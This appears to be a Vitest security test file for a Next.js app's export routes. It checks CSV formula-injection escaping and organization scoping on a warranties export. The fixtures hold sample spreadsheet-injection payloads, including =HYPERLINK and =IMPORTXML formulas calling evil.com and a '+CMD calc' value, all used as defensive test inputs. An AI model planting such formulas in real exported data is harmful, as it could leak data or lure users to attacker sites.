/**
 * Security tests: CSV formula injection & org-scoping for export routes
 *
 * Fix 1 — caja/export: escapeCsv must neutralize formula-starting values
 * Fix 2 — audit-logs/export: description field must be neutralized before quoting
 * Fix 3 — garantias/export: Supabase query must use ordenes_servicio.organization_id
 */
import { describe, it, expect, vi, beforeEach } from "vitest"
import { NextRequest } from "next/server"
import { mockAuthSuccess, mockSupabaseFrom, createChainMock } from "./helpers"

// --- Fix 1: caja/export ---

vi.mock("@/lib/caja-utils", () => ({
  fetchMovimientosDia: vi.fn(),
  computeTotales: vi.fn(() => ({
    totalDia: 0,
    totalIngresos: 0,
    totalEgresos: 0,
  })),
}))

vi.mock("@/lib/sucursal", () => ({
  sucursalParaLectura: vi.fn().mockResolvedValue({ verTodas: true, sucursalId: null }),
}))

vi.mock("@/lib/auth-utils", () => ({
  requireAdmin: vi.fn().mockResolvedValue({
    error: null,
    session: { user: { id: "u-1", sucursalId: null } },
    role: "ADMIN",
    organizationId: "org-1",
  }),
  requireAuth: vi.fn().mockResolvedValue({
    error: null,
    session: { user: { id: "u-1", sucursalId: null } },
    role: "ADMIN",
    organizationId: "org-1",
  }),
}))

vi.mock("@/lib/superadmin-auth", () => ({
  requireSuperadmin: vi.fn().mockResolvedValue({ error: null, email: "sadmin@test.com" }),
}))

vi.mock("@/lib/superadmin-audit", () => ({
  createSuperadminAuditLogger: vi.fn(() => ({
    log: vi.fn().mockResolvedValue(undefined),
  })),
}))

import { fetchMovimientosDia } from "@/lib/caja-utils"

describe("Fix 1 - GET /api/caja/export: formula injection in referencia", () => {
  beforeEach(() => {
    vi.clearAllMocks()
    vi.mocked(fetchMovimientosDia).mockResolvedValue([])
  })

  it("neutralizes a referencia that starts with = by prefixing with single-quote", async () => {
    const maliciousReferencia = "=HYPERLINK(\"http://evil.com\",\"Click\")"

    vi.mocked(fetchMovimientosDia).mockResolvedValue([
      {
        tipo: "COBRO_ORDEN",
        monto: 100,
        metodoPago: "EFECTIVO",
        fecha: "2024-01-15T10:00:00",
        referencia: maliciousReferencia,
        referenciaId: "ref-1",
        observaciones: null,
        esEgreso: false,
      },
    ] as any)

    const { GET } = await import("@/app/api/caja/export/route")
    const req = new Request("http://localhost:3000/api/caja/export?fecha=2024-01-15")
    const res = await GET(req)

    expect(res.status).toBe(200)
    const csvBody = await res.text()

    // The cell must be prefixed with ' to neutralize the formula
    expect(csvBody).toContain("'=HYPERLINK")
    // Must NOT appear as a bare formula cell
    expect(csvBody).not.toMatch(/(?:^|,)=HYPERLINK/)
  })

  it("neutralizes a referencia that starts with + by prefixing with single-quote", async () => {
    vi.mocked(fetchMovimientosDia).mockResolvedValue([
      {
        tipo: "COBRO_ORDEN",
        monto: 50,
        metodoPago: "EFECTIVO",
        fecha: "2024-01-15T10:00:00",
        referencia: "+CMD calc",
        referenciaId: "ref-2",
        observaciones: null,
        esEgreso: false,
      },
    ] as any)

    const { GET } = await import("@/app/api/caja/export/route")
    const req = new Request("http://localhost:3000/api/caja/export?fecha=2024-01-15")
    const res = await GET(req)

    expect(res.status).toBe(200)
    const csvBody = await res.text()

    expect(csvBody).toContain("'+CMD")
  })

  it("passes through a safe referencia unchanged", async () => {
    vi.mocked(fetchMovimientosDia).mockResolvedValue([
      {
        tipo: "COBRO_ORDEN",
        monto: 200,
        metodoPago: "EFECTIVO",
        fecha: "2024-01-15T10:00:00",
        referencia: "Orden 123",
        referenciaId: "ref-3",
        observaciones: null,
        esEgreso: false,
      },
    ] as any)

    const { GET } = await import("@/app/api/caja/export/route")
    const req = new Request("http://localhost:3000/api/caja/export?fecha=2024-01-15")
    const res = await GET(req)

    expect(res.status).toBe(200)
    const csvBody = await res.text()

    expect(csvBody).toContain("Orden 123")
  })
})

// --- Fix 2: audit-logs/export ---

describe("Fix 2 - GET /api/superadmin/audit-logs/export: formula injection in description", () => {
  beforeEach(() => {
    vi.clearAllMocks()
  })

  function makeAuditLog(description: string) {
    return {
      id: "log-1",
      organization_id: "org-1",
      user_id: "u-1",
      action: "UPDATE",
      entity: "ordenes_servicio",
      entity_id: "e-1",
      changes: { description },
      ip_address: "127.0.0.1",
      user_agent: "test",
      created_at: "2024-01-15T10:00:00Z",
    }
  }

  it("neutralizes a description starting with = by prefixing with single-quote inside quotes", async () => {
    const maliciousDesc = "=IMPORTXML(\"http://evil.com/\",\"//body\")"

    const logsChain = createChainMock([makeAuditLog(maliciousDesc)])
    const usersChain = createChainMock([{ id: "u-1", nombre: "Admin", email: "admin@t.com" }])
    const orgsChain = createChainMock([{ id: "org-1", nombre: "Org Test", slug: "org-test" }])

    mockSupabaseFrom({
      audit_logs: logsChain,
      users: usersChain,
      organizations: orgsChain,
    })

    const { GET } = await import("@/app/api/superadmin/audit-logs/export/route")
    const req = new Request("http://localhost:3000/api/superadmin/audit-logs/export")
    const res = await GET(req)

    expect(res.status).toBe(200)
    const csvBody = await res.text()

    // The description cell must contain the neutralized prefix
    expect(csvBody).toContain("'=IMPORTXML")
    // Must NOT appear as bare unprotected formula
    expect(csvBody).not.toMatch(/,"=IMPORTXML/)
  })

  it("neutralizes a description starting with @ by prefixing with single-quote", async () => {
    const atDesc = "@SUM malicious payload"

    const logsChain = createChainMock([makeAuditLog(atDesc)])
    const usersChain = createChainMock([{ id: "u-1", nombre: "Admin", email: "admin@t.com" }])
    const orgsChain = createChainMock([{ id: "org-1", nombre: "Org Test", slug: "org-test" }])

    mockSupabaseFrom({
      audit_logs: logsChain,
      users: usersChain,
      organizations: orgsChain,
    })

    const { GET } = await import("@/app/api/superadmin/audit-logs/export/route")
    const req = new Request("http://localhost:3000/api/superadmin/audit-logs/export")
    const res = await GET(req)

    expect(res.status).toBe(200)
    const csvBody = await res.text()

    expect(csvBody).toContain("'@SUM")
  })

  it("passes through a safe description unchanged", async () => {
    const safeDesc = "Updated order status to completed"

    const logsChain = createChainMock([makeAuditLog(safeDesc)])
    const usersChain = createChainMock([{ id: "u-1", nombre: "Admin", email: "admin@t.com" }])
    const orgsChain = createChainMock([{ id: "org-1", nombre: "Org Test", slug: "org-test" }])

    mockSupabaseFrom({
      audit_logs: logsChain,
      users: usersChain,
      organizations: orgsChain,
    })

    const { GET } = await import("@/app/api/superadmin/audit-logs/export/route")
    const req = new Request("http://localhost:3000/api/superadmin/audit-logs/export")
    const res = await GET(req)

    expect(res.status).toBe(200)
    const csvBody = await res.text()

    expect(csvBody).toContain(safeDesc)
  })
})

// --- Fix 3: garantias/export - org scoping ---

vi.mock("@/lib/subscriptions", () => ({
  hasPlanFeature: vi.fn().mockResolvedValue(true),
}))

function exportRequest(entity: string, query = "") {
  const url = `http://localhost:3000/api/export/${entity}${query}`
  return {
    req: new NextRequest(url),
    ctx: { params: Promise.resolve({ entity }) },
  }
}

describe("Fix 3 - GET /api/export/garantias: org scoping uses ordenes_servicio.organization_id", () => {
  beforeEach(() => {
    vi.clearAllMocks()
  })

  it("queries garantias with .eq('ordenes_servicio.organization_id', orgId)", async () => {
    // requireAuth is mocked statically above returning organizationId: "org-1"
    const orgId = "org-1"

    const garantiasChain = createChainMock([])
    mockSupabaseFrom({ garantias: garantiasChain })

    const { GET } = await import("@/app/api/export/[entity]/route")
    const { req, ctx } = exportRequest("garantias")
    const res = await GET(req, ctx)

    expect(res.status).toBe(200)

    const eqCalls: [string, string][] = vi.mocked(garantiasChain.eq).mock.calls as any

    // Must use the correct join alias for org scoping (ordenes_servicio, not orden)
    const correctCall = eqCalls.find(
      ([col, val]) => col === "ordenes_servicio.organization_id" && val === orgId
    )
    expect(correctCall).toBeDefined()

    // Must NOT use the wrong alias (orden.organization_id) that bypasses RLS
    const wrongCall = eqCalls.find(([col]) => col === "orden.organization_id")
    expect(wrongCall).toBeUndefined()
  })
})
